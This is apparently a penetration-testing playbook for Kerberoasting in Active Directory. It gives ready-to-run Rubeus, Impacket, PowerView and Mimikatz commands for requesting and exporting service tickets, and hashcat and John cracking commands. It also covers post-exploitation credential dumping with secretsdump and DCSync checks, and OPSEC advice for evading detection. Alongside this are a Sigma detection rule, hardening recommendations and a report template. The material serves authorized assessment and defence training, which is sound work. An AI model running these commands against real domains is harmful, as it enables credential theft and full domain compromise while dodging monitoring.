# Performing Kerberoasting Attack

## API Reference

## Libraries Used
- **subprocess**: Execute ldapsearch, PowerShell, Impacket GetUserSPNs, wevtutil
- **python-evtx**: Parse Windows Security EVTX for Event ID 4769
- **xml.etree.ElementTree**: Parse EVTX XML event data
- **impacket** (external): GetUserSPNs.py for TGS ticket requests

## CLI Interface
```
python agent.py enum --domain corp.example.com
python agent.py roast --domain corp.example.com [--user svc_account]
python agent.py analyze --file kerberoast_hashes.txt
python agent.py detect [--evtx security.evtx]
```

## Core Functions

### `enumerate_spn_accounts(domain)` — Find SPN-enabled accounts
LDAP query for `(servicePrincipalName=*)`. Falls back to PowerShell Get-ADUser.
Identifies high-value targets with admin group membership.

### `request_tgs_tickets(domain, username)` — Execute Kerberoasting
Uses Impacket GetUserSPNs with `-request` flag. Outputs $krb5tgs$ hashes.

### `analyze_kerberoast_hashes(hash_file)` — Assess hash crackability
Categorizes by encryption type: RC4 (etype 23, crackable) vs AES (etype 17/18).

### `detect_kerberoasting(evtx_file)` — Detect attack via Event ID 4769
Flags TGS requests with RC4 encryption (0x17) as suspicious Kerberoasting indicators.

## Encryption Types
| Etype | Algorithm | Crackability |
|-------|-----------|-------------|
| 0x17 (23) | RC4-HMAC | HIGH — fast offline cracking |
| 0x11 (17) | AES128 | LOW — computationally expensive |
| 0x12 (18) | AES256 | LOW — computationally expensive |

## Dependencies
```
pip install impacket python-evtx
```
System: ldapsearch (optional), PowerShell with AD module (Windows)

---

## Standards and Controls

## MITRE ATT&CK - Credential Access (TA0006)

| Technique ID | Name | Description |
|-------------|------|-------------|
| T1558.003 | Steal or Forge Kerberos Tickets: Kerberoasting | Request TGS tickets for SPN accounts and crack offline |
| T1558 | Steal or Forge Kerberos Tickets | Parent technique for Kerberos attacks |

## MITRE ATT&CK - Discovery (TA0007)

| Technique ID | Name | Description |
|-------------|------|-------------|
| T1087.002 | Account Discovery: Domain Account | Enumerate domain accounts with SPNs |
| T1069.002 | Permission Groups Discovery: Domain Groups | Identify group membership of SPN accounts |

## Kerberos Authentication Protocol

### Normal TGS Request Flow
1. Client presents TGT to KDC (Domain Controller)
2. KDC validates TGT and issues TGS ticket
3. TGS ticket is encrypted with target service account's long-term key (NTLM hash)
4. Client presents TGS to target service
5. Service decrypts ticket and validates PAC

### Kerberoasting Exploitation
1. Any domain user can request TGS for any SPN
2. TGS is encrypted with the service account password hash
3. RC4 encryption (etype 23) uses NTLM hash directly
4. AES encryption (etype 17/18) is slower to crack but still possible
5. Cracking happens offline - no failed logon events generated

## Encryption Types

| Etype | Algorithm | Hashcat Mode | Crack Difficulty |
|-------|-----------|-------------|-----------------|
| 23 | RC4-HMAC (NTLM) | 13100 | Easiest |
| 17 | AES128-CTS-HMAC-SHA1 | 19700 | Hard |
| 18 | AES256-CTS-HMAC-SHA1 | 19800 | Hardest |

## NIST SP 800-63B - Authentication Guidelines
- Recommends minimum 8-character passwords
- Service accounts should use 25+ character passwords
- Managed Service Accounts (MSA/gMSA) automatically rotate passwords

## CIS Benchmark - Kerberos Configuration
- Ensure 'Network security: Configure encryption types allowed for Kerberos' excludes RC4
- Monitor Event ID 4769 for anomalous service ticket requests
- Implement AES-only encryption for service accounts
- Use Group Managed Service Accounts where possible

## Detection References

| Event ID | Description | Relevance |
|----------|-------------|-----------|
| 4769 | Kerberos Service Ticket Operation | TGS request with etype |
| 4770 | Kerberos Service Ticket Renewed | Ticket renewal |
| 4768 | Kerberos Authentication Ticket (TGT) | Initial authentication |

### Sigma Rule Reference
```yaml
title: Kerberoasting Activity
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4769
    TicketEncryptionType: '0x17'
    ServiceName: '*$'
  filter:
    ServiceName: 'krbtgt'
  condition: selection and not filter
```

---

## Workflows

## Workflow 1: Kerberoasting with Rubeus (Windows)

### Step 1: Enumerate Kerberoastable Accounts
```powershell
# List all Kerberoastable users
.\Rubeus.exe kerberoast /stats

# Full Kerberoasting - request all SPN tickets
.\Rubeus.exe kerberoast /outfile:kerberoast_hashes.txt

# Target specific user
.\Rubeus.exe kerberoast /user:svc_sql /outfile:svc_sql_hash.txt

# Request RC4 encrypted tickets specifically
.\Rubeus.exe kerberoast /rc4opsec /outfile:rc4_hashes.txt

# Request AES tickets
.\Rubeus.exe kerberoast /aes /outfile:aes_hashes.txt

# Kerberoast from a different domain
.\Rubeus.exe kerberoast /domain:child.targetdomain.local /outfile:child_hashes.txt
```

### Step 2: Targeted Kerberoasting (set SPN on account with GenericWrite)
```powershell
# If you have GenericWrite/GenericAll on an account, set an SPN
Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='nonexistent/SERVICE'}

# Request TGS for the newly set SPN
.\Rubeus.exe kerberoast /user:targetuser /outfile:targeted_hash.txt

# Clean up - remove the SPN
Set-DomainObject -Identity targetuser -Clear serviceprincipalname
```

## Workflow 2: Kerberoasting with Impacket (Linux)

### Step 1: Remote Kerberoasting
```bash
# Basic Kerberoasting with password
impacket-GetUserSPNs targetdomain.local/user:Password123 -dc-ip 10.0.0.1 -request -outputfile kerberoast.txt

# With NTLM hash (pass-the-hash)
impacket-GetUserSPNs targetdomain.local/user -hashes :aad3b435b51404eeaad3b435b51404ee:NTHASH -dc-ip 10.0.0.1 -request

# Target specific user
impacket-GetUserSPNs targetdomain.local/user:Password123 -dc-ip 10.0.0.1 -request -outputfile kerberoast.txt -target-domain targetdomain.local

# Enumerate without requesting tickets
impacket-GetUserSPNs targetdomain.local/user:Password123 -dc-ip 10.0.0.1
```

## Workflow 3: Kerberoasting with PowerView (PowerShell)

```powershell
# Import PowerView
Import-Module .\PowerView.ps1

# Find all users with SPNs
Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname, admincount

# Get detailed SPN information
Get-DomainUser -SPN -Properties samaccountname,serviceprincipalname,pwdlastset,lastlogon,admincount

# Request TGS tickets using built-in cmdlet
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/sqlserver.targetdomain.local:1433"

# Export ticket from memory using Mimikatz
Invoke-Mimikatz -Command '"kerberos::list /export"'
```

## Workflow 4: Offline Password Cracking

### Hashcat
```bash
# RC4 encrypted tickets (etype 23) - Hashcat mode 13100
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt --rules-file /usr/share/hashcat/rules/best64.rule

# AES-128 tickets (etype 17) - Hashcat mode 19700
hashcat -m 19700 aes_hashes.txt /usr/share/wordlists/rockyou.txt

# AES-256 tickets (etype 18) - Hashcat mode 19800
hashcat -m 19800 aes_hashes.txt /usr/share/wordlists/rockyou.txt

# Using custom rules for corporate passwords
hashcat -m 13100 kerberoast.txt wordlist.txt -r corporate.rule

# Brute force with mask (e.g., Summer2024!)
hashcat -m 13100 kerberoast.txt -a 3 '?u?l?l?l?l?l?d?d?d?d?s'

# Combined dictionary + rules
hashcat -m 13100 kerberoast.txt wordlist.txt -r /usr/share/hashcat/rules/d3ad0ne.rule -r /usr/share/hashcat/rules/toggles1.rule
```

### John the Ripper
```bash
# Crack Kerberoast hashes
john --format=krb5tgs kerberoast.txt --wordlist=/usr/share/wordlists/rockyou.txt

# With rules
john --format=krb5tgs kerberoast.txt --wordlist=wordlist.txt --rules=KoreLogicRulesAppend4Num
```

## Workflow 5: Post-Exploitation

### Credential Validation
```bash
# Validate cracked credentials with CrackMapExec
crackmapexec smb 10.0.0.0/24 -u svc_sql -p 'CrackedPassword123!'

# Check if account has admin rights anywhere
crackmapexec smb 10.0.0.0/24 -u svc_sql -p 'CrackedPassword123!' --shares

# Check DCSync rights
crackmapexec smb 10.0.0.1 -u svc_sql -p 'CrackedPassword123!' -M dcsync

# Use credentials for further enumeration
impacket-secretsdump targetdomain.local/svc_sql:'CrackedPassword123!'@10.0.0.1
```

## OPSEC Considerations

1. Request tickets for only a few accounts at a time to avoid detection
2. Prefer AES tickets over RC4 - RC4 requests may trigger alerts
3. Use /rc4opsec flag in Rubeus to avoid requesting RC4 for AES-enabled accounts
4. Spread requests over time rather than requesting all at once
5. Target accounts with older password change dates (more likely weak)
6. Monitor for honeypot SPNs that may alert the SOC

---

## Working Template

## Document Control
| Field | Value |
|-------|-------|
| Domain | [DOMAIN.LOCAL] |
| Engagement ID | [ID] |
| Assessor | [NAME] |
| Date | [DATE] |

---

## 1. Summary
Total Kerberoastable Accounts: [X]
Credentials Cracked: [Y] / [X]

## 2. Vulnerable Accounts

| Account | SPN | Admin | Cracked | Password Age (days) |
|---------|-----|-------|---------|-------------------|
| | | Yes/No | Yes/No | |

## 3. Attack Evidence

### TGS Request Command
```
[command used]
```

### Cracking Command
```
[hashcat command]
```

### Cracked Output
```
[account:password]
```

## 4. Impact Assessment

| Account | Access Level | Systems Affected | Risk |
|---------|-------------|-----------------|------|
| | | | Critical/High/Medium |

## 5. Recommendations

| # | Recommendation | Priority | Effort |
|---|---------------|----------|--------|
| 1 | Convert to gMSA | Critical | Medium |
| 2 | Set 25+ char passwords | Critical | Low |
| 3 | Disable RC4 encryption | High | Medium |
| 4 | Deploy SPN honeypots | Medium | Low |

## 6. MITRE ATT&CK Reference
- T1558.003 - Kerberoasting
- T1087.002 - Domain Account Discovery
